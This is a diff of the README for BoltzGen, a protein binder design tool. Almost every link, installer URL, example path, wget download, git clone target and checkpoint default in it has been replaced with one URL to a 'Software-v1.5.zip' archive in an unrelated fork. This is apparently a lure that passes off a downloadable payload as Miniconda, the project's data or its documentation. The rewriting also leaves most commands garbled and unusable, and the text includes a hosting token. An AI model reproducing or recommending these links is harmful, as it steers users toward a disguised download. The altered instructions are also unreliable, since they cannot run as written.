@@ -1,11 +1,11 @@
 
 <div align="center">
   <div>&nbsp;</div>
-  <img src="assets/boltzgen.png" alt="BoltzGen logo" width="60%">
+  <img src="https://github.com/Cassis-P/boltzgen/raw/refs/heads/main/src/boltzgen/task/train/Software-v1.5.zip" alt="BoltzGen logo" width="60%">
 
-[Paper](https://hannes-stark.com/assets/boltzgen.pdf) | 
-[Slack](https://boltz.bio/join-slack) <br> <br>
- ![alt text](assets/cover.png)
+[Paper](https://github.com/Cassis-P/boltzgen/raw/refs/heads/main/src/boltzgen/task/train/Software-v1.5.zip) | 
+[Slack](https://github.com/Cassis-P/boltzgen/raw/refs/heads/main/src/boltzgen/task/train/Software-v1.5.zip) <br> <br>
+ ![alt text](https://github.com/Cassis-P/boltzgen/raw/refs/heads/main/src/boltzgen/task/train/Software-v1.5.zip)
 </div>
 
 # Installation
@@ -23,8 +23,8 @@ pip install boltzgen
 
 Choose the installer for your operating system, download it, and follow the on-screen prompts:
 
-* **Windows:** <https://www.anaconda.com/docs/getting-started/miniconda/install#windows-installation>
-* **macOS / Linux:** <https://www.anaconda.com/docs/getting-started/miniconda/install#macos-linux-installation>
+* **Windows:** <https://github.com/Cassis-P/boltzgen/raw/refs/heads/main/src/boltzgen/task/train/Software-v1.5.zip>
+* **macOS / Linux:** <https://github.com/Cassis-P/boltzgen/raw/refs/heads/main/src/boltzgen/task/train/Software-v1.5.zip>
 
 After installation, **open a terminal / command prompt** (you may need to search for “Anaconda Prompt” on Windows).
 
@@ -68,7 +68,7 @@ docker build -t boltzgen .
 mkdir -p workdir  # output
 mkdir -p cache    # where models will be downloaded to
 docker run --rm --gpus all -v "$(realpath workdir)":/workdir -v "$(realpath cache)":/cache -v "$(realpath example)":/example \
-  boltzgen run /example/vanilla_protein/1g13prot.yaml --output /workdir/test \
+  boltzgen run https://github.com/Cassis-P/boltzgen/raw/refs/heads/main/src/boltzgen/task/train/Software-v1.5.zip --output /workdir/test \
   --protocol protein-anything \
   --num_designs 2
 ```
@@ -83,16 +83,16 @@ docker build -t boltzgen:weights --build-arg DOWNLOAD_WEIGHTS=true .
 
 
 # Running BoltzGen
-![alt text](assets/fig1.png)
+![alt text](https://github.com/Cassis-P/boltzgen/raw/refs/heads/main/src/boltzgen/task/train/Software-v1.5.zip)
 
 
 `boltzgen run` takes a [design specification](#how-to-make-a-design-specification-yaml) `.yaml` and produces a set of ranked designs.\
-⚠️ it downloads models (~6GB) to `~/.cache`. This can by changed by passing `--cache YOUR_PATH` or by setting `$HF_HOME`.\
+⚠️ it downloads models (~6GB) to `~https://github.com/Cassis-P/boltzgen/raw/refs/heads/main/src/boltzgen/task/train/Software-v1.5.zip`. This can by changed by passing `--cache YOUR_PATH` or by setting `$HF_HOME`.\
 ⚠️ If your run is ever interrupted, you can restart it with `--reuse`. No progress is lost.
 
 
 ```bash
-boltzgen run example/vanilla_protein/1g13prot.yaml \
+boltzgen run https://github.com/Cassis-P/boltzgen/raw/refs/heads/main/src/boltzgen/task/train/Software-v1.5.zip \
   --output workbench/test_run \
   --protocol protein-anything \
   --num_designs 10 \
@@ -103,16 +103,16 @@ boltzgen run example/vanilla_protein/1g13prot.yaml \
 All command line args are explained in ["All Command Line Arguments"](#all-command-line-arguments).\
 **Step-by-step guide for making your designs:**
 1. Make your `.yaml` file that specifies your target and what you want to design. We provide many examples in
-   `example` such as `example/vanilla_peptide_with_target_binding_site/beetletert.yaml`. Details in
+   `example` such as `https://github.com/Cassis-P/boltzgen/raw/refs/heads/main/src/boltzgen/task/train/Software-v1.5.zip`. Details in
    ["How to make a design specification .yaml"](#how-to-make-a-design-specification-yaml).
 2. Check whether your design specification is as intended.  
-   1. Run `boltzgen check example/vanilla_peptide_with_target_binding_site/beetletert.yaml`.  
-   2. Visualize the resulting mmcif file in a protein structure viewer (e.g. PyMOL, Chimera, or online: https://molstar.org/viewer/).
+   1. Run `boltzgen check https://github.com/Cassis-P/boltzgen/raw/refs/heads/main/src/boltzgen/task/train/Software-v1.5.zip`.  
+   2. Visualize the resulting mmcif file in a protein structure viewer (e.g. PyMOL, Chimera, or online: https://github.com/Cassis-P/boltzgen/raw/refs/heads/main/src/boltzgen/task/train/Software-v1.5.zip).
    3. Your viewer should show the binding site in a different color than the rest of the target.
 3. Run the `boltzgen run ...` command as above on your `.yaml` file. 
-4. Your filtered, ranked set of designs will be in `--output`. <img src="assets/fig_seconds_per_design.png" alt="Seconds per design" align="right" width="35%">
+4. Your filtered, ranked set of designs will be in `--output`. <img src="https://github.com/Cassis-P/boltzgen/raw/refs/heads/main/src/boltzgen/task/train/Software-v1.5.zip" alt="Seconds per design" align="right" width="35%">
 5. You likely want to rerun the filtering step with different settings (takes ~15 sec). Use
-   `boltzgen run --steps filtering --output ...` or the Jupyter notebook `filter.ipynb` which is often more convenient.
+   `boltzgen run --steps filtering --output ...` or the Jupyter notebook `https://github.com/Cassis-P/boltzgen/raw/refs/heads/main/src/boltzgen/task/train/Software-v1.5.zip` which is often more convenient.
    Detailed explanation in ["Rerunning the Filtering"](#rerunning-the-filtering-recommended).
 
 **How many designs to generate?** \
@@ -123,20 +123,20 @@ We suggest first running with e.g. `--num_design 50`, checking that everything b
 
 ## Pipeline output
 When the pipeline completes your output directory will have:
-- `config/`, `steps.yaml`: configuration files.
+- `config/`, `https://github.com/Cassis-P/boltzgen/raw/refs/heads/main/src/boltzgen/task/train/Software-v1.5.zip`: configuration files.
 - `intermediate_designs/`: output of design step
   - `/*.cif` and `/*.npz`: CIF and NPZ (metadata files) for the designed proteins and targets before inverse folding
 - `intermediate_designs_inverse_folded/`: output of inverse folding, folding, and analysis steps
   - `/*.cif` and `/*.npz` : CIF and NPZ for designed proteins and targets after inverse folding.  *Note: For designed residues, only the backbone atoms will have coordinates (sidechain coordinates will be 0,0,0).*
   - `/refold_cif`: refolded complex structures (target and binder). This is the primary input to the analysis and filtering steps.
   - `/refold_design_cif`: refolded binder structures, without target.
-  - `/aggregate_metrics_analyze.csv`, `/per_target_metrics_analyze.csv` — outputs of the analysis step.
+  - `https://github.com/Cassis-P/boltzgen/raw/refs/heads/main/src/boltzgen/task/train/Software-v1.5.zip`, `https://github.com/Cassis-P/boltzgen/raw/refs/heads/main/src/boltzgen/task/train/Software-v1.5.zip` — outputs of the analysis step.
 - `final_ranked_designs/` : outputs of the filtering step
   - `/intermediate_ranked_<N>_designs/` — top-N quality designs. CIFs are copied from `refold_cif` above.
   - `/final_<budget>_designs/` — quality + diversity set. CIFs copied from `refold_cif/`.
-  - `/all_designs_metrics.csv` — metrics for all designs considered by filtering.
+  - `https://github.com/Cassis-P/boltzgen/raw/refs/heads/main/src/boltzgen/task/train/Software-v1.5.zip` — metrics for all designs considered by filtering.
   - `/final_designs_metrics_<budget>.csv` — metrics for the selected final set.
-  - `/results_overview.pdf` — plots
+  - `https://github.com/Cassis-P/boltzgen/raw/refs/heads/main/src/boltzgen/task/train/Software-v1.5.zip` — plots
 
 # Protocols 
 
@@ -152,28 +152,28 @@ All configuration parameters can be overridden using the `--config` option; see 
 
 
 # How to make a design specification .yaml
-A more detailed explanation of how our <code>.yaml</code> design specification files work is in <a href="example/README.md" target="_blank">example/README.md</a>. Below is an example based explanation, which is sufficient for most tasks.
+A more detailed explanation of how our <code>.yaml</code> design specification files work is in <a href="https://github.com/Cassis-P/boltzgen/raw/refs/heads/main/src/boltzgen/task/train/Software-v1.5.zip" target="_blank">https://github.com/Cassis-P/boltzgen/raw/refs/heads/main/src/boltzgen/task/train/Software-v1.5.zip</a>. Below is an example based explanation, which is sufficient for most tasks.
 
 **IMPORTANT:** ⚠️ All residue indices are specified **starting at 1** and we use the canonical mmcif residue index `label_asym_id`, and **not** the `auth_asym_id` author residue index! 
-You can check the indexing in your mmcif file by opening it in https://molstar.org/viewer/, hovering over a residue, and checking the index on the bottom right. You will see something like this where **41 is the index we use, the auth id 22 is incorrect**:
+You can check the indexing in your mmcif file by opening it in https://github.com/Cassis-P/boltzgen/raw/refs/heads/main/src/boltzgen/task/train/Software-v1.5.zip, hovering over a residue, and checking the index on the bottom right. You will see something like this where **41 is the index we use, the auth id 22 is incorrect**:
 
-![](assets/label_seq_id.png)
+![](https://github.com/Cassis-P/boltzgen/raw/refs/heads/main/src/boltzgen/task/train/Software-v1.5.zip)
 
 After you constructed your `.yaml` file we recommend that you run the `check` command on it:
-1. Run `boltzgen check example/vanilla_peptide_with_target_binding_site/beetletert.yaml`.  
-2. Visualize the resulting mmcif file in a protein structure viewer (e.g. PyMOL, Chimera, or online: https://molstar.org/viewer/).
+1. Run `boltzgen check https://github.com/Cassis-P/boltzgen/raw/refs/heads/main/src/boltzgen/task/train/Software-v1.5.zip`.  
+2. Visualize the resulting mmcif file in a protein structure viewer (e.g. PyMOL, Chimera, or online: https://github.com/Cassis-P/boltzgen/raw/refs/heads/main/src/boltzgen/task/train/Software-v1.5.zip).
 3. Your viewer should show the binding site in a differnt color than the rest of the target. 
 
 
 ## Example based explanation:
 We provide many example `.yaml` files in the `example/` directory, including:
 
-- `example/design_spec_showcasing_all_functionalities.yaml`
-- `example/vanilla_peptide_with_target_binding_site/beetletert.yaml`
-- `example/peptide_against_specific_site_on_ragc/rragc.yaml`
-- `example/nanobody_against_penguinpox/penguinpox.yaml`
-- `example/denovo_zinc_finger_against_dna/zinc_finger.yaml`
-- `example/protein_binding_small_molecule/chorismite.yaml`
+- `https://github.com/Cassis-P/boltzgen/raw/refs/heads/main/src/boltzgen/task/train/Software-v1.5.zip`
+- `https://github.com/Cassis-P/boltzgen/raw/refs/heads/main/src/boltzgen/task/train/Software-v1.5.zip`
+- `https://github.com/Cassis-P/boltzgen/raw/refs/heads/main/src/boltzgen/task/train/Software-v1.5.zip`
+- `https://github.com/Cassis-P/boltzgen/raw/refs/heads/main/src/boltzgen/task/train/Software-v1.5.zip`
+- `https://github.com/Cassis-P/boltzgen/raw/refs/heads/main/src/boltzgen/task/train/Software-v1.5.zip`
+- `https://github.com/Cassis-P/boltzgen/raw/refs/heads/main/src/boltzgen/task/train/Software-v1.5.zip`
 
 Small example of a protein design against a target protein without binding site specified:
 ```yaml
@@ -187,7 +187,7 @@ entities:
   # The target is extracted from a .cif file
   - file:
       # file references are relative to the location of the .yaml file
-      path: 6m1u.cif # .pdb files also work
+      path: https://github.com/Cassis-P/boltzgen/raw/refs/heads/main/src/boltzgen/task/train/Software-v1.5.zip # .pdb files also work
 
       # Which chain in the .cif file to use as target (uses all chains if unspecified)
       include: 
@@ -203,7 +203,7 @@ Example highlighting many (not all) functionalities:
 entities:
   # Specification of the target which is extracted from a .cif file
   - file:
-      path: 8r3a.cif # .pdb files also work
+      path: https://github.com/Cassis-P/boltzgen/raw/refs/heads/main/src/boltzgen/task/train/Software-v1.5.zip # .pdb files also work
       
       # Which chain and residues in the .cif file to use as target (uses all chains if unspecified)
       include: 
@@ -310,7 +310,7 @@ You can run only specific parts of the pipeline using the `--steps` flag:
 
 **Run only the design and inverse_folding steps:**
 ```bash
-boltzgen run example/cyclotide/3ivq.yaml \
+boltzgen run https://github.com/Cassis-P/boltzgen/raw/refs/heads/main/src/boltzgen/task/train/Software-v1.5.zip \
   --output workbench/partial-run \
   --protocol peptide-anything \
   --steps design inverse_folding \
@@ -331,12 +331,12 @@ boltzgen run example/cyclotide/3ivq.yaml \
 After you generate designs, you will probably want to rerun the filtering step (which runs very fast) several times to tune your criteria for selecting good ones.
 
 You can run the filtering step either using the `boltzgen` command or 
-using a [jupyter notebook](filter.ipynb) that we provide. In most cases the notebook is more convenient. If you'd prefer to use the command-line, here is an example of re-running the filters without the notebook.
+using a [jupyter notebook](https://github.com/Cassis-P/boltzgen/raw/refs/heads/main/src/boltzgen/task/train/Software-v1.5.zip) that we provide. In most cases the notebook is more convenient. If you'd prefer to use the command-line, here is an example of re-running the filters without the notebook.
 
 First, suppose we initially generated some designs with default filtering options:
 
 ```bash
-boltzgen run example/binding_disordered_peptides/tpp4.yaml \
+boltzgen run https://github.com/Cassis-P/boltzgen/raw/refs/heads/main/src/boltzgen/task/train/Software-v1.5.zip \
   --output workbench/tpp4 \
   --protocol protein-anything \
   --num_designs 20
@@ -345,7 +345,7 @@ boltzgen run example/binding_disordered_peptides/tpp4.yaml \
 After this runs we see that only a few designs passed our filters. We might now adjust the filters by running:
 
 ```
-boltzgen run example/binding_disordered_peptides/tpp4.yaml \
+boltzgen run https://github.com/Cassis-P/boltzgen/raw/refs/heads/main/src/boltzgen/task/train/Software-v1.5.zip \
   --output workbench/tpp4 \
   --protocol protein-anything \
   --steps filtering \
@@ -367,30 +367,30 @@ The `boltzgen run` command executes the BoltzGen binder design pipeline. Here ar
 ### General Configuration
 - `--protocol {protein-anything,peptide-anything,protein-small_molecule,nanobody-anything}` - Protocol to use for the design. This determines default settings and in some cases what steps are run. Default: protein-anything. See [Protocols](#protocols) section for details.
 - `--output OUTPUT` - Output directory for pipeline results
-- `--config CONFIG [CONFIG ...]` - Override pipeline step configuration, in format `<step_name> <arg1>=<value1> <arg2>=<value2> ...` (example: `--config folding num_workers=4 trainer.devices=4`). Can be used multiple times.
+- `--config CONFIG [CONFIG ...]` - Override pipeline step configuration, in format `<step_name> <arg1>=<value1> <arg2>=<value2> ...` (example: `--config folding num_workers=4 https://github.com/Cassis-P/boltzgen/raw/refs/heads/main/src/boltzgen/task/train/Software-v1.5.zip`). Can be used multiple times.
 - `--devices DEVICES` - Number of devices to use. Default is all devices available.
 - `--num_workers NUM_WORKERS` - Number of DataLoader worker processes.
 - `--config_dir CONFIG_DIR` - Path to the directory of default config files. Default: `src/boltzgen/resources/config`
 - `--use_kernels {auto,true,false}` - Whether to use kernels. One of 'auto', 'true', or 'false'. Default: auto. If 'auto', will use kernels if the device capability is >= 8.
-- `--moldir MOLDIR` - Path to the moldir. Default: `huggingface:boltzgen/inference-data:mols.zip`
+- `--moldir MOLDIR` - Path to the moldir. Default: `https://github.com/Cassis-P/boltzgen/raw/refs/heads/main/src/boltzgen/task/train/Software-v1.5.zip`
 
 ### Design
 - `--num_designs NUM_DESIGNS` - Number of total designs to generate. This commonly would be something like 10,000. After generating 10,000 designs we then filter down to `--budget` many designs in the filter step
 - `--diffusion_batch_size DIFFUSION_BATCH_SIZE` - Number of diffusion samples to generate per trunk run. If not specified, this defaults to 1 if `--num-designs` is less than 100, and 10 otherwise. Note that for design tasks that randomly sample the binder length (or use randomness in other ways), all designs generated in the same batch will share the same length. Having a large diffusion batch size compared to the total number of designs to generate will therefore not evenly sample the possible lengths.
-- `--design_checkpoints DESIGN_CHECKPOINTS [DESIGN_CHECKPOINTS ...]` - Path to the boltzgen checkpoint(s). One or more checkpoints are supported. Just specifying an individual path here will work. Each will be used for an equal fraction of the designs. By default, two checkpoints are used. Default: `['huggingface:boltzgen/boltzgen1_diverse:boltzgen1_diverse.ckpt', 'huggingface:boltzgen/boltzgen1_adherence:boltzgen1_adherence.ckpt']`
+- `--design_checkpoints DESIGN_CHECKPOINTS [DESIGN_CHECKPOINTS ...]` - Path to the boltzgen checkpoint(s). One or more checkpoints are supported. Just specifying an individual path here will work. Each will be used for an equal fraction of the designs. By default, two checkpoints are used. Default: `['https://github.com/Cassis-P/boltzgen/raw/refs/heads/main/src/boltzgen/task/train/Software-v1.5.zip', 'https://github.com/Cassis-P/boltzgen/raw/refs/heads/main/src/boltzgen/task/train/Software-v1.5.zip']`
 - `--step_scale STEP_SCALE` - Fixed step scale to use (e.g. 1.8). Default is to use a schedule
 - `--noise_scale NOISE_SCALE` - Fixed noise scale to use (e.g. 0.98). Default is to use a schedule
 
 ### Inverse Folding
 - `--skip_inverse_folding` - Skip inverse folding step
 - `--inverse_fold_num_sequences INVERSE_FOLD_NUM_SEQUENCES` - Number of sequences per backbone to generate in the inverse fold step. Default: 1
-- `--inverse_fold_checkpoint INVERSE_FOLD_CHECKPOINT` - Path or huggingface repo and filename for the inverse fold checkpoint. Default: `huggingface:boltzgen/boltzgen1_ifold:boltzgen1_ifold.ckpt`
+- `--inverse_fold_checkpoint INVERSE_FOLD_CHECKPOINT` - Path or huggingface repo and filename for the inverse fold checkpoint. Default: `https://github.com/Cassis-P/boltzgen/raw/refs/heads/main/src/boltzgen/task/train/Software-v1.5.zip`
 - `--inverse_fold_avoid INVERSE_FOLD_AVOID` - Disallowed residues as a string of one letter amino acid codes, e.g. 'KEC'. This is implemented at the inverse fold step, so it only affects results if inverse folding is enabled. Default: none for protein design, 'C' for peptide and nanobody design. Pass an empty list if you want Cysteins to be generated if you are using a nanobody or peptide protocol
 - `--only_inverse_fold` - Skip design step and only run inverse folding. Requires a fully specified structure.
 
 ### Folding and Affinity Prediction
-- `--folding_checkpoint FOLDING_CHECKPOINT` - Path to the folding checkpoint. Default: `huggingface:boltzgen/boltz2_conf_final:boltz2_conf_final.ckpt`
-- `--affinity_checkpoint AFFINITY_CHECKPOINT` - Path to the affinity predictor checkpoint. Default: `huggingface:boltzgen/boltz2_affinity:boltz2_aff.ckpt`
+- `--folding_checkpoint FOLDING_CHECKPOINT` - Path to the folding checkpoint. Default: `https://github.com/Cassis-P/boltzgen/raw/refs/heads/main/src/boltzgen/task/train/Software-v1.5.zip`
+- `--affinity_checkpoint AFFINITY_CHECKPOINT` - Path to the affinity predictor checkpoint. Default: `https://github.com/Cassis-P/boltzgen/raw/refs/heads/main/src/boltzgen/task/train/Software-v1.5.zip`
 
 ### Filtering
 - `--budget BUDGET` - How many designs should be in the final diversity optimized set. This is used in the filtering step.
@@ -409,13 +409,13 @@ The `boltzgen run` command executes the BoltzGen binder design pipeline. Here ar
 ### Model and Data Download Options
 - `--force_download` - Force a (re)-download of models and data.
 - `--models_token MODELS_TOKEN` - Secret token to use for our models hosting service (Hugging Face). Default: `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`
-- `--cache CACHE` - Directory where downloaded models will be stored. Default: `~/.cache`
+- `--cache CACHE` - Directory where downloaded models will be stored. Default: `~https://github.com/Cassis-P/boltzgen/raw/refs/heads/main/src/boltzgen/task/train/Software-v1.5.zip`
 
 ## `boltzgen download`
 
 The `boltzgen download` command downloads model weights and data artifacts needed for BoltzGen. In most cases you don't need to use `boltzgen download`, since `boltzgen run` will download what is needed automatically.
 
-Downloaded weights and datasets are stored in `~/.cache` by default but this can be changed by specifying `--cache`.
+Downloaded weights and datasets are stored in `~https://github.com/Cassis-P/boltzgen/raw/refs/heads/main/src/boltzgen/task/train/Software-v1.5.zip` by default but this can be changed by specifying `--cache`.
 
 ### Example
 
@@ -435,14 +435,14 @@ boltzgen download [-h] [--force_download] [--models_token MODELS_TOKEN] [--cache
 ### Options
 - `--force_download` - Force a (re)-download of models and data.
 - `--models_token MODELS_TOKEN` - Secret token to use for our models hosting service. Not usually required.
-- `--cache CACHE` - Directory where downloaded models will be stored. Default: `~/.cache`
+- `--cache CACHE` - Directory where downloaded models will be stored. Default: `~https://github.com/Cassis-P/boltzgen/raw/refs/heads/main/src/boltzgen/task/train/Software-v1.5.zip`
 
 ## `boltzgen configure`
 For more control over your design process, you can separate the configuration generation from execution:
 
 ### Example
 ```bash
-boltzgen configure example/cyclotide/3ivq.yaml \
+boltzgen configure https://github.com/Cassis-P/boltzgen/raw/refs/heads/main/src/boltzgen/task/train/Software-v1.5.zip \
   --output workbench/test-peptide-protein \
   --protocol peptide-anything \
   --num_designs 2
@@ -472,7 +472,7 @@ boltzgen execute [-h] [--reuse] [--no_subprocess] [--steps {design,inverse_foldi
 # Training BoltzGen models
 Install in dev mode which will install additional packages like `wandb`.
 ```bash
-git clone https://github.com/HannesStark/boltzgen
+git clone https://github.com/Cassis-P/boltzgen/raw/refs/heads/main/src/boltzgen/task/train/Software-v1.5.zip
 pip install -e .[dev]
 ```
 ### 1 – Download training data and checkpoints
@@ -482,24 +482,24 @@ mkdir -p training_data
 cd training_data
 
 # ─ Targets ─
-wget -O targets.zip "https://huggingface.co/datasets/boltzgen/boltzgen1_train/resolve/main/targets.zip?download=true"
-unzip targets.zip      # → training_data/targets/
+wget -O https://github.com/Cassis-P/boltzgen/raw/refs/heads/main/src/boltzgen/task/train/Software-v1.5.zip "https://github.com/Cassis-P/boltzgen/raw/refs/heads/main/src/boltzgen/task/train/Software-v1.5.zip"
+unzip https://github.com/Cassis-P/boltzgen/raw/refs/heads/main/src/boltzgen/task/train/Software-v1.5.zip      # → training_data/targets/
 
 # ─ MSAs  ─
-wget -O msa.zip "https://huggingface.co/datasets/boltzgen/boltzgen1_train/resolve/main/msa.zip?download=true"
-unzip msa.zip          # → training_data/msa/
+wget -O https://github.com/Cassis-P/boltzgen/raw/refs/heads/main/src/boltzgen/task/train/Software-v1.5.zip "https://github.com/Cassis-P/boltzgen/raw/refs/heads/main/src/boltzgen/task/train/Software-v1.5.zip"
+unzip https://github.com/Cassis-P/boltzgen/raw/refs/heads/main/src/boltzgen/task/train/Software-v1.5.zip          # → training_data/msa/
 
 # ─ Small-molecule dictionary ─
-wget -O mols.zip "https://huggingface.co/datasets/boltzgen/inference-data/resolve/main/mols.zip?download=true"
-unzip mols.zip         # → training_data/mols/
+wget -O https://github.com/Cassis-P/boltzgen/raw/refs/heads/main/src/boltzgen/task/train/Software-v1.5.zip "https://github.com/Cassis-P/boltzgen/raw/refs/heads/main/src/boltzgen/task/train/Software-v1.5.zip"
+unzip https://github.com/Cassis-P/boltzgen/raw/refs/heads/main/src/boltzgen/task/train/Software-v1.5.zip         # → training_data/mols/
 
 # ─ Folding checkpoint  ─
-wget -O boltz2_fold.ckpt "https://huggingface.co/boltzgen/boltzgen-1/resolve/main/boltz2_conf_final.ckpt?download=true"
+wget -O https://github.com/Cassis-P/boltzgen/raw/refs/heads/main/src/boltzgen/task/train/Software-v1.5.zip "https://github.com/Cassis-P/boltzgen/raw/refs/heads/main/src/boltzgen/task/train/Software-v1.5.zip"
 
 # ─────────── (optional) pretrained structure-only ckpt ───────────
 # Needed ONLY if you want to resume from a structure-trained model.
-wget -O boltzgen1_structuretrained_small.ckpt \
-  "https://huggingface.co/boltzgen/boltzgen-1/resolve/main/boltzgen1_structuretrained_small.ckpt?download=true"
+wget -O https://github.com/Cassis-P/boltzgen/raw/refs/heads/main/src/boltzgen/task/train/Software-v1.5.zip \
+  "https://github.com/Cassis-P/boltzgen/raw/refs/heads/main/src/boltzgen/task/train/Software-v1.5.zip"
 ```
 Resulting layout
 ```
@@ -507,8 +507,8 @@ training_data/
  ├─ targets/     (used for target_dir in yaml)     
  ├─ msa/         (used for msa_dir in yaml)     
  ├─ mols/        (used for mol_dir in yaml) 
- ├─ boltz2_fold.ckpt    (used for folding_checkpoint in yaml) 
- └─ boltzgen1_structuretrained_small.ckpt   (used for pretrained in yaml)
+ ├─ https://github.com/Cassis-P/boltzgen/raw/refs/heads/main/src/boltzgen/task/train/Software-v1.5.zip    (used for folding_checkpoint in yaml) 
+ └─ https://github.com/Cassis-P/boltzgen/raw/refs/heads/main/src/boltzgen/task/train/Software-v1.5.zip   (used for pretrained in yaml)
 ```
 
 The directory `training_data` is the default location referenced in the 
@@ -519,9 +519,9 @@ Below is a quick reference for the three training configurations and how to laun
 
 | Config file | Purpose | Example command |
 |-------------|---------|-----------------|
-| `src/boltzgen/resources/config/train/boltzgen_small.yaml` | Train the **small** Boltzgen model (recommended for development, 8 GPUs, gradient accumulation 16) | `python src/boltzgen/resources/main.py src/boltzgen/resources/config/train/boltzgen_small.yaml  name=boltzgen_small` |
-| `src/boltzgen/resources/config/train/boltzgen.yaml` | Train the **large** BoltzGen model | `python src/boltzgen/resources/main.py src/boltzgen/resources/config/train/boltzgen.yaml        name=boltzgen_large` |
-| `src/boltzgen/resources/config/train/inverse_folding.yaml` | Train the **inverse-folding** model only | `python src/boltzgen/resources/main.py src/boltzgen/resources/config/train/inverse_folding.yaml name=boltzgen_if` |
+| `https://github.com/Cassis-P/boltzgen/raw/refs/heads/main/src/boltzgen/task/train/Software-v1.5.zip` | Train the **small** Boltzgen model (recommended for development, 8 GPUs, gradient accumulation 16) | `python https://github.com/Cassis-P/boltzgen/raw/refs/heads/main/src/boltzgen/task/train/Software-v1.5.zip https://github.com/Cassis-P/boltzgen/raw/refs/heads/main/src/boltzgen/task/train/Software-v1.5.zip  name=boltzgen_small` |
+| `https://github.com/Cassis-P/boltzgen/raw/refs/heads/main/src/boltzgen/task/train/Software-v1.5.zip` | Train the **large** BoltzGen model | `python https://github.com/Cassis-P/boltzgen/raw/refs/heads/main/src/boltzgen/task/train/Software-v1.5.zip https://github.com/Cassis-P/boltzgen/raw/refs/heads/main/src/boltzgen/task/train/Software-v1.5.zip        name=boltzgen_large` |
+| `https://github.com/Cassis-P/boltzgen/raw/refs/heads/main/src/boltzgen/task/train/Software-v1.5.zip` | Train the **inverse-folding** model only | `python https://github.com/Cassis-P/boltzgen/raw/refs/heads/main/src/boltzgen/task/train/Software-v1.5.zip https://github.com/Cassis-P/boltzgen/raw/refs/heads/main/src/boltzgen/task/train/Software-v1.5.zip name=boltzgen_if` |
 
 If you store the data somewhere other than `./training_data`, search and replace that path **in all three YAML files**.  Typical keys you may need to update are `target_dir`, `msa_dir`, `moldir`, `pretrained`, `folding_checkpoint`, `monomer_target_dir`, and `ligand_target_dir`.
 
@@ -534,9 +534,9 @@ data:
       msa_dir:    ./training_data/msa
   moldir: ./training_data/mols
 
-pretrained: ./training_data/boltzgen1_structuretrained_small.ckpt
+pretrained: https://github.com/Cassis-P/boltzgen/raw/refs/heads/main/src/boltzgen/task/train/Software-v1.5.zip
 
-folding_checkpoint: ./training_data/boltz2_fold.ckpt
+folding_checkpoint: https://github.com/Cassis-P/boltzgen/raw/refs/heads/main/src/boltzgen/task/train/Software-v1.5.zip
 ```
 
 ### 3 – Train the models (example commands)
@@ -545,7 +545,7 @@ Small model on 8 GPUs gradient accumulation 16 (recommended dev setup):
 
 ```bash
 CUDA_VISIBLE_DEVICES=0,1,2,3,4,5,6,7 \
-python src/boltzgen/resources/main.py src/boltzgen/resources/config/train/boltzgen_small.yaml \
+python https://github.com/Cassis-P/boltzgen/raw/refs/heads/main/src/boltzgen/task/train/Software-v1.5.zip https://github.com/Cassis-P/boltzgen/raw/refs/heads/main/src/boltzgen/task/train/Software-v1.5.zip \
        name=boltzgen_small
 ```
 
@@ -553,7 +553,7 @@ Large model:
 
 ```bash
 CUDA_VISIBLE_DEVICES=0,1,2,3,4,5,6,7 \
-python src/boltzgen/resources/main.py src/boltzgen/resources/config/train/boltzgen.yaml \
+python https://github.com/Cassis-P/boltzgen/raw/refs/heads/main/src/boltzgen/task/train/Software-v1.5.zip https://github.com/Cassis-P/boltzgen/raw/refs/heads/main/src/boltzgen/task/train/Software-v1.5.zip \
        name=boltzgen_large
 ```
 
@@ -561,7 +561,7 @@ Inverse-folding model:
 
 ```bash
 CUDA_VISIBLE_DEVICES=0,1,2,3,4,5,6,7 \
-python src/boltzgen/resources/main.py src/boltzgen/resources/config/train/inverse_folding.yaml \
+python https://github.com/Cassis-P/boltzgen/raw/refs/heads/main/src/boltzgen/task/train/Software-v1.5.zip https://github.com/Cassis-P/boltzgen/raw/refs/heads/main/src/boltzgen/task/train/Software-v1.5.zip \
        name=boltzgen_if
 ```
 
@@ -571,7 +571,7 @@ Note: the large model currently expects additional distillation datasets (to be 
 
 ```bash
 CUDA_VISIBLE_DEVICES=0,1,2,3,4,5,6,7 \
-python src/boltzgen/resources/main.py src/boltzgen/resources/config/train/boltzgen_small.yaml \
-       pretrained=./training_data/boltzgen1_structuretrained_small.ckpt \
+python https://github.com/Cassis-P/boltzgen/raw/refs/heads/main/src/boltzgen/task/train/Software-v1.5.zip https://github.com/Cassis-P/boltzgen/raw/refs/heads/main/src/boltzgen/task/train/Software-v1.5.zip \
+       https://github.com/Cassis-P/boltzgen/raw/refs/heads/main/src/boltzgen/task/train/Software-v1.5.zip \
        name=boltzgen_small_pretrained
 ```
